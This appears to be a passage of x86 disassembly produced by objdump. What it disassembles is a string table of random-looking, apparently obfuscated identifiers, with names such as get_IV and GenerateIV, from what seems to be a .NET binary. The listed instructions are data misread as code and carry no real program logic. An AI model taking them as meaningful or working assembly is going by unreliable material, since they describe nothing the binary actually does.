  407a72:	6b 53 74 68          	imul   $0x68,0x74(%ebx),%edx
  407a76:	4a                   	dec    %edx
  407a77:	78 45                	js     0x407abe
  407a79:	46                   	inc    %esi
  407a7a:	71 67                	jno    0x407ae3
  407a7c:	6c                   	insb   (%dx),%es:(%edi)
  407a7d:	4f                   	dec    %edi
  407a7e:	00 71 4f             	add    %dh,0x4f(%ecx)
  407a81:	78 47                	js     0x407aca
  407a83:	6e                   	outsb  %ds:(%esi),(%dx)
  407a84:	55                   	push   %ebp
  407a85:	49                   	dec    %ecx
  407a86:	49                   	dec    %ecx
  407a87:	76 48                	jbe    0x407ad1
  407a89:	75 4f                	jne    0x407ada
  407a8b:	00 4a 45             	add    %cl,0x45(%edx)
  407a8e:	48                   	dec    %eax
  407a8f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a90:	70 66                	jo     0x407af8
  407a92:	4a                   	dec    %edx
  407a93:	45                   	inc    %ebp
  407a94:	67 58                	addr16 pop %eax
  407a96:	67 63 50 50          	arpl   %edx,0x50(%bx,%si)
  407a9a:	00 42 61             	add    %al,0x61(%edx)
  407a9d:	53                   	push   %ebx
  407a9e:	52                   	push   %edx
  407a9f:	79 7a                	jns    0x407b1b
  407aa1:	73 6c                	jae    0x407b0f
  407aa3:	59                   	pop    %ecx
  407aa4:	4d                   	dec    %ebp
  407aa5:	52                   	push   %edx
  407aa6:	50                   	push   %eax
  407aa7:	00 74 61 42          	add    %dh,0x42(%ecx,%eiz,2)
  407aab:	46                   	inc    %esi
  407aac:	79 78                	jns    0x407b26
  407aae:	43                   	inc    %ebx
  407aaf:	6a 6d                	push   $0x6d
  407ab1:	4f                   	dec    %edi
  407ab2:	4e                   	dec    %esi
  407ab3:	53                   	push   %ebx
  407ab4:	41                   	inc    %ecx
  407ab5:	69 50 00 49 49 52 71 	imul   $0x71524949,0x0(%eax),%edx
  407abc:	49                   	dec    %ecx
  407abd:	62 5a 56             	bound  %ebx,0x56(%edx)
  407ac0:	4b                   	dec    %ebx
  407ac1:	65 6a 50             	gs push $0x50
  407ac4:	00 79 53             	add    %bh,0x53(%ecx)
  407ac7:	56                   	push   %esi
  407ac8:	49                   	dec    %ecx
  407ac9:	44                   	inc    %esp
  407aca:	53                   	push   %ebx
  407acb:	4a                   	dec    %edx
  407acc:	76 51                	jbe    0x407b1f
  407ace:	44                   	inc    %esp
  407acf:	78 50                	js     0x407b21
  407ad1:	00 6c 64 55          	add    %ch,0x55(%esp,%eiz,2)
  407ad5:	66 78 4f             	data16 js 0x407b27
  407ad8:	73 66                	jae    0x407b40
  407ada:	41                   	inc    %ecx
  407adb:	42                   	inc    %edx
  407adc:	4a                   	dec    %edx
  407add:	4c                   	dec    %esp
  407ade:	51                   	push   %ecx
  407adf:	00 53 6a             	add    %dl,0x6a(%ebx)
  407ae2:	51                   	push   %ecx
  407ae3:	4e                   	dec    %esi
  407ae4:	5a                   	pop    %edx
  407ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae6:	76 42                	jbe    0x407b2a
  407ae8:	74 4e                	je     0x407b38
  407aea:	51                   	push   %ecx
  407aeb:	00 4b 4f             	add    %cl,0x4f(%ebx)
  407aee:	49                   	dec    %ecx
  407aef:	52                   	push   %edx
  407af0:	44                   	inc    %esp
  407af1:	55                   	push   %ebp
  407af2:	56                   	push   %esi
  407af3:	78 42                	js     0x407b37
  407af5:	54                   	push   %esp
  407af6:	51                   	push   %ecx
  407af7:	00 4e 53             	add    %cl,0x53(%esi)
  407afa:	53                   	push   %ebx
  407afb:	44                   	inc    %esp
  407afc:	58                   	pop    %eax
  407afd:	6d                   	insl   (%dx),%es:(%edi)
  407afe:	44                   	inc    %esp
  407aff:	4e                   	dec    %esi
  407b00:	54                   	push   %esp
  407b01:	54                   	push   %esp
  407b02:	51                   	push   %ecx
  407b03:	00 41 7a             	add    %al,0x7a(%ecx)
  407b06:	45                   	inc    %ebp
  407b07:	69 58 77 65 79 52 72 	imul   $0x72527965,0x77(%eax),%ebx
  407b0e:	56                   	push   %esi
  407b0f:	6a 67                	push   $0x67
  407b11:	6f                   	outsl  %ds:(%esi),(%dx)
  407b12:	6d                   	insl   (%dx),%es:(%edi)
  407b13:	51                   	push   %ecx
  407b14:	00 49 4f             	add    %cl,0x4f(%ecx)
  407b17:	55                   	push   %ebp
  407b18:	59                   	pop    %ecx
  407b19:	61                   	popa
  407b1a:	46                   	inc    %esi
  407b1b:	59                   	pop    %ecx
  407b1c:	64 74 42             	fs je  0x407b61
  407b1f:	63 6f 51             	arpl   %ebp,0x51(%edi)
  407b22:	00 4a 45             	add    %cl,0x45(%edx)
  407b25:	62 43 52             	bound  %eax,0x52(%ebx)
  407b28:	69 63 70 46 54 7a 74 	imul   $0x747a5446,0x70(%ebx),%esp
  407b2f:	51                   	push   %ecx
  407b30:	00 47 77             	add    %al,0x77(%edi)
  407b33:	42                   	inc    %edx
  407b34:	7a 4a                	jp     0x407b80
  407b36:	51                   	push   %ecx
  407b37:	6f                   	outsl  %ds:(%esi),(%dx)
  407b38:	74 4b                	je     0x407b85
  407b3a:	43                   	inc    %ebx
  407b3b:	52                   	push   %edx
  407b3c:	00 4b 78             	add    %cl,0x78(%ebx)
  407b3f:	67 58                	addr16 pop %eax
  407b41:	6a 4a                	push   $0x4a
  407b43:	77 65                	ja     0x407baa
  407b45:	4d                   	dec    %ebp
  407b46:	53                   	push   %ebx
  407b47:	52                   	push   %edx
  407b48:	00 69 4d             	add    %ch,0x4d(%ecx)
  407b4b:	71 54                	jno    0x407ba1
  407b4d:	70 6a                	jo     0x407bb9
  407b4f:	76 6b                	jbe    0x407bbc
  407b51:	57                   	push   %edi
  407b52:	74 58                	je     0x407bac
  407b54:	58                   	pop    %eax
  407b55:	52                   	push   %edx
  407b56:	00 52 43             	add    %dl,0x43(%edx)
  407b59:	52                   	push   %edx
  407b5a:	45                   	inc    %ebp
  407b5b:	45                   	inc    %ebp
  407b5c:	54                   	push   %esp
  407b5d:	59                   	pop    %ecx
  407b5e:	71 61                	jno    0x407bc1
  407b60:	77 52                	ja     0x407bb4
  407b62:	00 6b 78             	add    %ch,0x78(%ebx)
  407b65:	62 44 5a 52          	bound  %eax,0x52(%edx,%ebx,2)
  407b69:	6c                   	insb   (%dx),%es:(%edi)
  407b6a:	73 72                	jae    0x407bde
  407b6c:	77 52                	ja     0x407bc0
  407b6e:	00 4f 66             	add    %cl,0x66(%edi)
  407b71:	61                   	popa
  407b72:	4e                   	dec    %esi
  407b73:	5a                   	pop    %edx
  407b74:	6d                   	insl   (%dx),%es:(%edi)
  407b75:	54                   	push   %esp
  407b76:	54                   	push   %esp
  407b77:	53                   	push   %ebx
  407b78:	6a 67                	push   $0x67
  407b7a:	56                   	push   %esi
  407b7b:	79 52                	jns    0x407bcf
  407b7d:	00 73 6b             	add    %dh,0x6b(%ebx)
  407b80:	44                   	inc    %esp
  407b81:	41                   	inc    %ecx
  407b82:	75 4a                	jne    0x407bce
  407b84:	4e                   	dec    %esi
  407b85:	59                   	pop    %ecx
  407b86:	6f                   	outsl  %ds:(%esi),(%dx)
  407b87:	50                   	push   %eax
  407b88:	4c                   	dec    %esp
  407b89:	53                   	push   %ebx
  407b8a:	00 67 6f             	add    %ah,0x6f(%edi)
  407b8d:	4a                   	dec    %edx
  407b8e:	76 61                	jbe    0x407bf1
  407b90:	4e                   	dec    %esi
  407b91:	48                   	dec    %eax
  407b92:	68 54 51 48 55       	push   $0x55485154
  407b97:	53                   	push   %ebx
  407b98:	00 55 7a             	add    %dl,0x7a(%ebp)
  407b9b:	4c                   	dec    %esp
  407b9c:	7a 74                	jp     0x407c12
  407b9e:	64 6b 78 6f 6f       	imul   $0x6f,%fs:0x6f(%eax),%edi
  407ba3:	69 46 54 6d 58 53 00 	imul   $0x53586d,0x54(%esi),%eax
  407baa:	6b 61 68 64          	imul   $0x64,0x68(%ecx),%esp
  407bae:	6c                   	insb   (%dx),%es:(%edi)
  407baf:	72 67                	jb     0x407c18
  407bb1:	6d                   	insl   (%dx),%es:(%edi)
  407bb2:	54                   	push   %esp
  407bb3:	66 70 74             	data16 jo 0x407c2a
  407bb6:	69 53 00 59 44 4c 75 	imul   $0x754c4459,0x0(%ebx),%edx
  407bbd:	4e                   	dec    %esi
  407bbe:	48                   	dec    %eax
  407bbf:	79 61                	jns    0x407c22
  407bc1:	67 6d                	insl   (%dx),%es:(%di)
  407bc3:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc4:	53                   	push   %ebx
  407bc5:	00 4b 41             	add    %cl,0x41(%ebx)
  407bc8:	5a                   	pop    %edx
  407bc9:	4d                   	dec    %ebp
  407bca:	6d                   	insl   (%dx),%es:(%edi)
  407bcb:	4a                   	dec    %edx
  407bcc:	66 4b                	dec    %bx
  407bce:	68 76 53 00 79       	push   $0x79005376
  407bd3:	55                   	push   %ebp
  407bd4:	43                   	inc    %ebx
  407bd5:	7a 77                	jp     0x407c4e
  407bd7:	4a                   	dec    %edx
  407bd8:	49                   	dec    %ecx
  407bd9:	61                   	popa
  407bda:	42                   	inc    %edx
  407bdb:	58                   	pop    %eax
  407bdc:	48                   	dec    %eax
  407bdd:	76 78                	jbe    0x407c57
  407bdf:	53                   	push   %ebx
  407be0:	00 57 41             	add    %dl,0x41(%edi)
  407be3:	48                   	dec    %eax
  407be4:	42                   	inc    %edx
  407be5:	4d                   	dec    %ebp
  407be6:	70 42                	jo     0x407c2a
  407be8:	74 52                	je     0x407c3c
  407bea:	79 53                	jns    0x407c3f
  407bec:	00 6b 41             	add    %ch,0x41(%ebx)
  407bef:	44                   	inc    %esp
  407bf0:	48                   	dec    %eax
  407bf1:	78 63                	js     0x407c56
  407bf3:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf4:	54                   	push   %esp
  407bf5:	64 4d                	fs dec %ebp
  407bf7:	6a 6f                	push   $0x6f
  407bf9:	79 53                	jns    0x407c4e
  407bfb:	00 52 4f             	add    %dl,0x4f(%edx)
  407bfe:	6f                   	outsl  %ds:(%esi),(%dx)
  407bff:	76 6e                	jbe    0x407c6f
  407c01:	49                   	dec    %ecx
  407c02:	54                   	push   %esp
  407c03:	52                   	push   %edx
  407c04:	57                   	push   %edi
  407c05:	69 74 50 54 00 54 4f 	imul   $0x584f5400,0x54(%eax,%edx,2),%esi
  407c0c:	58 
  407c0d:	50                   	push   %eax
  407c0e:	6b 77 67 76          	imul   $0x76,0x67(%edi),%esi
  407c12:	55                   	push   %ebp
  407c13:	6d                   	insl   (%dx),%es:(%edi)
  407c14:	49                   	dec    %ecx
  407c15:	69 49 53 54 00 64 65 	imul   $0x65640054,0x53(%ecx),%ecx
  407c1c:	76 46                	jbe    0x407c64
  407c1e:	61                   	popa
  407c1f:	66 67 65 74 71       	data16 addr16 gs je 0x407c95
  407c24:	4f                   	dec    %edi
  407c25:	54                   	push   %esp
  407c26:	54                   	push   %esp
  407c27:	00 66 70             	add    %ah,0x70(%esi)
  407c2a:	6a 62                	push   $0x62
  407c2c:	47                   	inc    %edi
  407c2d:	41                   	inc    %ecx
  407c2e:	6b 4f 48 48          	imul   $0x48,0x48(%edi),%ecx
  407c32:	6d                   	insl   (%dx),%es:(%edi)
  407c33:	70 62                	jo     0x407c97
  407c35:	54                   	push   %esp
  407c36:	00 58 7a             	add    %bl,0x7a(%eax)
  407c39:	66 76 6e             	data16 jbe 0x407caa
  407c3c:	74 68                	je     0x407ca6
  407c3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407c3f:	55                   	push   %ebp
  407c40:	73 41                	jae    0x407c83
  407c42:	65 54                	gs push %esp
  407c44:	00 61 58             	add    %ah,0x58(%ecx)
  407c47:	57                   	push   %edi
  407c48:	62 4d 59             	bound  %ecx,0x59(%ebp)
  407c4b:	57                   	push   %edi
  407c4c:	52                   	push   %edx
  407c4d:	47                   	inc    %edi
  407c4e:	4d                   	dec    %ebp
  407c4f:	78 54                	js     0x407ca5
  407c51:	00 72 63             	add    %dh,0x63(%edx)
  407c54:	76 66                	jbe    0x407cbc
  407c56:	66 4e                	dec    %si
  407c58:	64 6b 70 67 49       	imul   $0x49,%fs:0x67(%eax),%esi
  407c5d:	55                   	push   %ebp
  407c5e:	00 4a 47             	add    %cl,0x47(%edx)
  407c61:	6c                   	insb   (%dx),%es:(%edi)
  407c62:	4a                   	dec    %edx
  407c63:	52                   	push   %edx
  407c64:	57                   	push   %edi
  407c65:	6f                   	outsl  %ds:(%esi),(%dx)
  407c66:	4a                   	dec    %edx
  407c67:	4d                   	dec    %ebp
  407c68:	52                   	push   %edx
  407c69:	52                   	push   %edx
  407c6a:	52                   	push   %edx
  407c6b:	55                   	push   %ebp
  407c6c:	00 61 54             	add    %ah,0x54(%ecx)
  407c6f:	55                   	push   %ebp
  407c70:	73 4e                	jae    0x407cc0
  407c72:	53                   	push   %ebx
  407c73:	4f                   	dec    %edi
  407c74:	6e                   	outsb  %ds:(%esi),(%dx)
  407c75:	64 4c                	fs dec %esp
  407c77:	6c                   	insb   (%dx),%es:(%edi)
  407c78:	58                   	pop    %eax
  407c79:	63 55 00             	arpl   %edx,0x0(%ebp)
  407c7c:	57                   	push   %edi
  407c7d:	63 6c 76 58          	arpl   %ebp,0x58(%esi,%esi,2)
  407c81:	6e                   	outsb  %ds:(%esi),(%dx)
  407c82:	6d                   	insl   (%dx),%es:(%edi)
  407c83:	48                   	dec    %eax
  407c84:	45                   	inc    %ebp
  407c85:	78 65                	js     0x407cec
  407c87:	6a 55                	push   $0x55
  407c89:	00 51 52             	add    %dl,0x52(%ecx)
  407c8c:	68 58 56 44 57       	push   $0x57445658
  407c91:	58                   	pop    %eax
  407c92:	72 57                	jb     0x407ceb
  407c94:	68 6b 55 00 66       	push   $0x6600556b
  407c99:	62 51 5a             	bound  %edx,0x5a(%ecx)
  407c9c:	52                   	push   %edx
  407c9d:	57                   	push   %edi
  407c9e:	4a                   	dec    %edx
  407c9f:	63 45 4b             	arpl   %eax,0x4b(%ebp)
  407ca2:	47                   	inc    %edi
  407ca3:	7a 46                	jp     0x407ceb
  407ca5:	69 6c 55 00 51 58 73 	imul   $0x72735851,0x0(%ebp,%edx,2),%ebp
  407cac:	72 
  407cad:	59                   	pop    %ecx
  407cae:	6f                   	outsl  %ds:(%esi),(%dx)
  407caf:	69 45 48 4a 59 67 77 	imul   $0x7767594a,0x48(%ebp),%eax
  407cb6:	55                   	push   %ebp
  407cb7:	00 74 43 64          	add    %dh,0x64(%ebx,%eax,2)
  407cbb:	49                   	dec    %ecx
  407cbc:	71 42                	jno    0x407d00
  407cbe:	4a                   	dec    %edx
  407cbf:	56                   	push   %esi
  407cc0:	4a                   	dec    %edx
  407cc1:	45                   	inc    %ebp
  407cc2:	56                   	push   %esi
  407cc3:	00 6b 5a             	add    %ch,0x5a(%ebx)
  407cc6:	70 64                	jo     0x407d2c
  407cc8:	4d                   	dec    %ebp
  407cc9:	68 53 51 65 6b       	push   $0x6b655153
  407cce:	76 48                	jbe    0x407d18
  407cd0:	56                   	push   %esi
  407cd1:	00 67 65             	add    %ah,0x65(%edi)
  407cd4:	74 5f                	je     0x407d35
  407cd6:	49                   	dec    %ecx
  407cd7:	56                   	push   %esi
  407cd8:	00 73 65             	add    %dh,0x65(%ebx)
  407cdb:	74 5f                	je     0x407d3c
  407cdd:	49                   	dec    %ecx
  407cde:	56                   	push   %esi
  407cdf:	00 47 65             	add    %al,0x65(%edi)
  407ce2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ce3:	65 72 61             	gs jb  0x407d47
  407ce6:	74 65                	je     0x407d4d
  407ce8:	49                   	dec    %ecx
  407ce9:	56                   	push   %esi
  407cea:	00 79 45             	add    %bh,0x45(%ecx)
  407ced:	73 78                	jae    0x407d67
  407cef:	77 73                	ja     0x407d64
  407cf1:	48                   	dec    %eax
  407cf2:	67 4e                	addr16 dec %esi
  407cf4:	56                   	push   %esi
  407cf5:	00 49 47             	add    %cl,0x47(%ecx)
  407cf8:	6a 63                	push   $0x63
  407cfa:	73 6e                	jae    0x407d6a
  407cfc:	55                   	push   %ebp
  407cfd:	74 64                	je     0x407d63
  407cff:	55                   	push   %ebp
  407d00:	56                   	push   %esi
  407d01:	00 50 73             	add    %dl,0x73(%eax)
  407d04:	78 68                	js     0x407d6e
  407d06:	64 53                	fs push %ebx
  407d08:	50                   	push   %eax
  407d09:	6f                   	outsl  %ds:(%esi),(%dx)
  407d0a:	58                   	pop    %eax
  407d0b:	56                   	push   %esi
  407d0c:	00 71 4d             	add    %dh,0x4d(%ecx)
  407d0f:	62 70 78             	bound  %esi,0x78(%eax)
  407d12:	6f                   	outsl  %ds:(%esi),(%dx)
  407d13:	48                   	dec    %eax
  407d14:	70 6c                	jo     0x407d82
  407d16:	6c                   	insb   (%dx),%es:(%edi)
  407d17:	57                   	push   %edi
  407d18:	61                   	popa
  407d19:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1a:	5a                   	pop    %edx
  407d1b:	56                   	push   %esi
  407d1c:	00 6a 6b             	add    %ch,0x6b(%edx)
  407d1f:	52                   	push   %edx
  407d20:	6b 47 48 44          	imul   $0x44,0x48(%edi),%eax
  407d24:	4b                   	dec    %ebx
  407d25:	64 56                	fs push %esi
  407d27:	00 46 58             	add    %al,0x58(%esi)
  407d2a:	78 52                	js     0x407d7e
  407d2c:	76 43                	jbe    0x407d71
  407d2e:	4b                   	dec    %ebx
  407d2f:	61                   	popa
  407d30:	52                   	push   %edx
  407d31:	65 56                	gs push %esi
  407d33:	00 57 65             	add    %dl,0x65(%edi)
  407d36:	73 65                	jae    0x407d9d
  407d38:	58                   	pop    %eax
  407d39:	64 71 6f             	fs jno 0x407dab
  407d3c:	54                   	push   %esp
  407d3d:	7a 7a                	jp     0x407db9
  407d3f:	6b 56 00 76          	imul   $0x76,0x0(%esi),%edx
  407d43:	6c                   	insb   (%dx),%es:(%edi)
  407d44:	43                   	inc    %ebx
  407d45:	6c                   	insb   (%dx),%es:(%edi)
  407d46:	44                   	inc    %esp
  407d47:	61                   	popa
  407d48:	4a                   	dec    %edx
  407d49:	44                   	inc    %esp
  407d4a:	4c                   	dec    %esp
  407d4b:	76 73                	jbe    0x407dc0
  407d4d:	56                   	push   %esi
  407d4e:	00 66 6a             	add    %ah,0x6a(%esi)
  407d51:	6a 65                	push   $0x65
  407d53:	76 45                	jbe    0x407d9a
  407d55:	6e                   	outsb  %ds:(%esi),(%dx)
  407d56:	74 51                	je     0x407da9
  407d58:	57                   	push   %edi
  407d59:	77 56                	ja     0x407db1
  407d5b:	00 6e 73             	add    %ch,0x73(%esi)
  407d5e:	75 64                	jne    0x407dc4
  407d60:	76 73                	jbe    0x407dd5
  407d62:	6c                   	insb   (%dx),%es:(%edi)
  407d63:	41                   	inc    %ecx
  407d64:	6b 78 56 00          	imul   $0x0,0x56(%eax),%edi
  407d68:	48                   	dec    %eax
  407d69:	77 55                	ja     0x407dc0
  407d6b:	4b                   	dec    %ebx
  407d6c:	47                   	inc    %edi
  407d6d:	76 52                	jbe    0x407dc1
  407d6f:	67 4a                	addr16 dec %edx
  407d71:	4f                   	dec    %edi
  407d72:	42                   	inc    %edx
  407d73:	57                   	push   %edi
  407d74:	00 51 65             	add    %dl,0x65(%ecx)
  407d77:	55                   	push   %ebp
  407d78:	57                   	push   %edi
  407d79:	52                   	push   %edx
  407d7a:	66 68 61 6b          	pushw  $0x6b61
  407d7e:	71 7a                	jno    0x407dfa
  407d80:	68 49 57 00 67       	push   $0x67005749
  407d85:	56                   	push   %esi
  407d86:	76 59                	jbe    0x407de1
  407d88:	4c                   	dec    %esp
  407d89:	78 51                	js     0x407ddc
  407d8b:	48                   	dec    %eax
  407d8c:	63 7a 52             	arpl   %edi,0x52(%edx)
  407d8f:	4b                   	dec    %ebx
  407d90:	57                   	push   %edi
  407d91:	00 4b 65             	add    %cl,0x65(%ebx)
  407d94:	51                   	push   %ecx
  407d95:	77 4e                	ja     0x407de5
  407d97:	43                   	inc    %ebx
  407d98:	75 71                	jne    0x407e0b
  407d9a:	42                   	inc    %edx
  407d9b:	48                   	dec    %eax
  407d9c:	41                   	inc    %ecx
  407d9d:	4d                   	dec    %ebp
  407d9e:	57                   	push   %edi
  407d9f:	00 49 48             	add    %cl,0x48(%ecx)
  407da2:	75 63                	jne    0x407e07
  407da4:	44                   	inc    %esp
  407da5:	66 45                	inc    %bp
  407da7:	7a 6e                	jp     0x407e17
  407da9:	56                   	push   %esi
  407daa:	67 62 4d 57          	bound  %ecx,0x57(%di)
  407dae:	00 67 4a             	add    %ah,0x4a(%edi)
  407db1:	59                   	pop    %ecx
  407db2:	58                   	pop    %eax
  407db3:	4d                   	dec    %ebp
  407db4:	61                   	popa
  407db5:	54                   	push   %esp
  407db6:	43                   	inc    %ebx
  407db7:	64 78 4f             	fs js  0x407e09
  407dba:	57                   	push   %edi
  407dbb:	00 68 69             	add    %ch,0x69(%eax)
  407dbe:	50                   	push   %eax
  407dbf:	44                   	inc    %esp
  407dc0:	71 63                	jno    0x407e25
  407dc2:	54                   	push   %esp
  407dc3:	59                   	pop    %ecx
  407dc4:	71 55                	jno    0x407e1b
  407dc6:	57                   	push   %edi
  407dc7:	00 50 50             	add    %dl,0x50(%eax)
  407dca:	63 7a 77             	arpl   %edi,0x77(%edx)
  407dcd:	43                   	inc    %ebx
  407dce:	7a 78                	jp     0x407e48
  407dd0:	51                   	push   %ecx
  407dd1:	6c                   	insb   (%dx),%es:(%edi)
  407dd2:	58                   	pop    %eax
  407dd3:	57                   	push   %edi
  407dd4:	00 63 69             	add    %ah,0x69(%ebx)
  407dd7:	4d                   	dec    %ebp
  407dd8:	4d                   	dec    %ebp
  407dd9:	58                   	pop    %eax
  407dda:	71 52                	jno    0x407e2e
  407ddc:	69 72 5a 57 00 4c 76 	imul   $0x764c0057,0x5a(%edx),%esi
  407de3:	71 4c                	jno    0x407e31
  407de5:	52                   	push   %edx
  407de6:	74 64                	je     0x407e4c
  407de8:	78 5a                	js     0x407e44
  407dea:	74 4a                	je     0x407e36
  407dec:	7a 6a                	jp     0x407e58
  407dee:	75 57                	jne    0x407e47
  407df0:	00 59 51             	add    %bl,0x51(%ecx)
  407df3:	53                   	push   %ebx
  407df4:	4f                   	dec    %edi
  407df5:	66 66 4a             	data16 dec %dx
  407df8:	6b 58 47 58          	imul   $0x58,0x47(%eax),%ebx
  407dfc:	00 73 53             	add    %dh,0x53(%ebx)
  407dff:	4e                   	dec    %esi
  407e00:	61                   	popa
  407e01:	44                   	inc    %esp
  407e02:	74 74                	je     0x407e78
  407e04:	43                   	inc    %ebx
  407e05:	4f                   	dec    %edi
  407e06:	66 47                	inc    %di
  407e08:	58                   	pop    %eax
  407e09:	00 79 6c             	add    %bh,0x6c(%ecx)
  407e0c:	4a                   	dec    %edx
  407e0d:	79 51                	jns    0x407e60
  407e0f:	43                   	inc    %ebx
  407e10:	65 6b 76 4a 58       	imul   $0x58,%gs:0x4a(%esi),%esi
  407e15:	00 41 4e             	add    %al,0x4e(%ecx)
  407e18:	4d                   	dec    %ebp
  407e19:	55                   	push   %ebp
  407e1a:	4e                   	dec    %esi
  407e1b:	73 64                	jae    0x407e81
  407e1d:	74 59                	je     0x407e78
  407e1f:	57                   	push   %edi
  407e20:	68 52 58 00 7a       	push   $0x7a005852
  407e25:	4d                   	dec    %ebp
  407e26:	6c                   	insb   (%dx),%es:(%edi)
  407e27:	51                   	push   %ecx
  407e28:	6f                   	outsl  %ds:(%esi),(%dx)
  407e29:	6a 79                	push   $0x79
  407e2b:	4b                   	dec    %ebx
  407e2c:	75 65                	jne    0x407e93
  407e2e:	77 75                	ja     0x407ea5
  407e30:	58                   	pop    %eax
  407e31:	00 52 64             	add    %dl,0x64(%edx)
  407e34:	51                   	push   %ecx
  407e35:	55                   	push   %ebp
  407e36:	6a 53                	push   $0x53
  407e38:	6a 44                	push   $0x44
  407e3a:	65 7a 50             	gs jp  0x407e8d
  407e3d:	61                   	popa
  407e3e:	5a                   	pop    %edx
  407e3f:	41                   	inc    %ecx
  407e40:	71 46                	jno    0x407e88
  407e42:	59                   	pop    %ecx
  407e43:	00 6e 65             	add    %ch,0x65(%esi)
  407e46:	56                   	push   %esi
  407e47:	49                   	dec    %ecx
  407e48:	6b 67 5a 55          	imul   $0x55,0x5a(%edi),%esp
  407e4c:	53                   	push   %ebx
  407e4d:	70 61                	jo     0x407eb0
  407e4f:	59                   	pop    %ecx
  407e50:	00 48 6e             	add    %cl,0x6e(%eax)
  407e53:	67 73 70             	addr16 jae 0x407ec6
  407e56:	43                   	inc    %ebx
  407e57:	57                   	push   %edi
  407e58:	6c                   	insb   (%dx),%es:(%edi)
  407e59:	5a                   	pop    %edx
  407e5a:	55                   	push   %ebp
  407e5b:	6a 62                	push   $0x62
  407e5d:	59                   	pop    %ecx
  407e5e:	00 53 78             	add    %dl,0x78(%ebx)
  407e61:	7a 68                	jp     0x407ecb
  407e63:	44                   	inc    %esp
  407e64:	47                   	inc    %edi
  407e65:	46                   	inc    %esi
  407e66:	53                   	push   %ebx
  407e67:	73 63                	jae    0x407ecc
  407e69:	6d                   	insl   (%dx),%es:(%edi)
  407e6a:	67 59                	addr16 pop %ecx
  407e6c:	00 6a 73             	add    %ch,0x73(%edx)
  407e6f:	49                   	dec    %ecx
  407e70:	44                   	inc    %esp
  407e71:	67 43                	addr16 inc %ebx
  407e73:	61                   	popa
  407e74:	4c                   	dec    %esp
  407e75:	66 79 59             	data16 jns 0x407ed1
  407e78:	00 46 64             	add    %al,0x64(%esi)
  407e7b:	4e                   	dec    %esi
  407e7c:	61                   	popa
  407e7d:	53                   	push   %ebx
  407e7e:	7a 56                	jp     0x407ed6
  407e80:	63 64 79 42          	arpl   %esp,0x42(%ecx,%edi,2)
  407e84:	76 41                	jbe    0x407ec7
  407e86:	5a                   	pop    %edx
  407e87:	00 4b 58             	add    %cl,0x58(%ebx)
  407e8a:	49                   	dec    %ecx
  407e8b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e8c:	75 6c                	jne    0x407efa
  407e8e:	50                   	push   %eax
  407e8f:	62 78 73             	bound  %edi,0x73(%eax)
  407e92:	49                   	dec    %ecx
  407e93:	44                   	inc    %esp
  407e94:	5a                   	pop    %edx
  407e95:	00 72 70             	add    %dh,0x70(%edx)
  407e98:	57                   	push   %edi
  407e99:	66 63 79 4a          	arpl   %di,0x4a(%ecx)
  407e9d:	41                   	inc    %ecx
  407e9e:	4e                   	dec    %esi
  407e9f:	66 41                	inc    %cx
  407ea1:	49                   	dec    %ecx
  407ea2:	5a                   	pop    %edx
  407ea3:	00 52 4f             	add    %dl,0x4f(%edx)
  407ea6:	65 4a                	gs dec %edx
  407ea8:	46                   	inc    %esi
  407ea9:	43                   	inc    %ebx
  407eaa:	51                   	push   %ecx
  407eab:	4b                   	dec    %ebx
  407eac:	52                   	push   %edx
  407ead:	46                   	inc    %esi
  407eae:	55                   	push   %ebp
  407eaf:	6d                   	insl   (%dx),%es:(%edi)
  407eb0:	76 7a                	jbe    0x407f2c
  407eb2:	4b                   	dec    %ebx
  407eb3:	5a                   	pop    %edx
  407eb4:	00 45 75             	add    %al,0x75(%ebp)
  407eb7:	66 6f                	outsw  %ds:(%esi),(%dx)
  407eb9:	73 6a                	jae    0x407f25
  407ebb:	48                   	dec    %eax
  407ebc:	76 4c                	jbe    0x407f0a
  407ebe:	5a                   	pop    %edx
  407ebf:	00 54 4b 6f          	add    %dl,0x6f(%ebx,%ecx,2)
  407ec3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec4:	61                   	popa
  407ec5:	61                   	popa
  407ec6:	52                   	push   %edx
  407ec7:	49                   	dec    %ecx
  407ec8:	73 4e                	jae    0x407f18
  407eca:	59                   	pop    %ecx
  407ecb:	54                   	push   %esp
  407ecc:	53                   	push   %ebx
  407ecd:	5a                   	pop    %edx
  407ece:	00 70 5a             	add    %dh,0x5a(%eax)
  407ed1:	78 4c                	js     0x407f1f
  407ed3:	53                   	push   %ebx
  407ed4:	41                   	inc    %ecx
  407ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed6:	59                   	pop    %ecx
  407ed7:	74 65                	je     0x407f3e
  407ed9:	5a                   	pop    %edx
  407eda:	4b                   	dec    %ebx
  407edb:	75 71                	jne    0x407f4e
  407edd:	63 5a 00             	arpl   %ebx,0x0(%edx)
  407ee0:	48                   	dec    %eax
  407ee1:	48                   	dec    %eax
  407ee2:	69 64 73 6e 67 62 74 	imul   $0x67746267,0x6e(%ebx,%esi,2),%esp
  407ee9:	67 
  407eea:	5a                   	pop    %edx
  407eeb:	00 76 61             	add    %dh,0x61(%esi)
  407eee:	6c                   	insb   (%dx),%es:(%edi)
  407eef:	75 65                	jne    0x407f56
  407ef1:	5f                   	pop    %edi
  407ef2:	5f                   	pop    %edi
  407ef3:	00 51 45             	add    %dl,0x45(%ecx)
  407ef6:	65 43                	gs inc %ebx
  407ef8:	6b 59 70 4e          	imul   $0x4e,0x70(%ecx),%ebx
  407efc:	48                   	dec    %eax
  407efd:	67 42                	addr16 inc %edx
  407eff:	61                   	popa
  407f00:	00 66 77             	add    %ah,0x77(%esi)
  407f03:	55                   	push   %ebp
  407f04:	5a                   	pop    %edx
  407f05:	50                   	push   %eax
  407f06:	4d                   	dec    %ebp
  407f07:	48                   	dec    %eax
  407f08:	7a 59                	jp     0x407f63
  407f0a:	61                   	popa
  407f0b:	00 42 6f             	add    %al,0x6f(%edx)
  407f0e:	50                   	push   %eax
  407f0f:	5a                   	pop    %edx
  407f10:	75 69                	jne    0x407f7b
  407f12:	7a 50                	jp     0x407f64
  407f14:	4c                   	dec    %esp
  407f15:	77 73                	ja     0x407f8a
  407f17:	61                   	popa
